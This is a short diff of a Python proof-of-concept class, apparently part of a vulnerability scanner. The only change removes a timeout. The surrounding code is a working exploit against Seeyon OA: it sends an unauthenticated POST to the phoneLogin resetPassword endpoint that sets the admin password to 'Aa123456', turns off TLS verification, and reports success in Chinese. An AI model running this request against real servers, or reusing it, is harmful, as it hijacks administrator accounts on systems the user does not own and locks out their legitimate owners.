@@ -46,7 +46,7 @@ class poc:
         url = "{}://{}/seeyon/rest/phoneLogin/phoneCode/resetPassword".format(scheme, netloc)
         data = '{"loginName":"admin","password":"Aa123456"}'
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             if result.status_code == 200 and result.json()["message"] == "success":
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意账号密码重置漏洞\033[0m
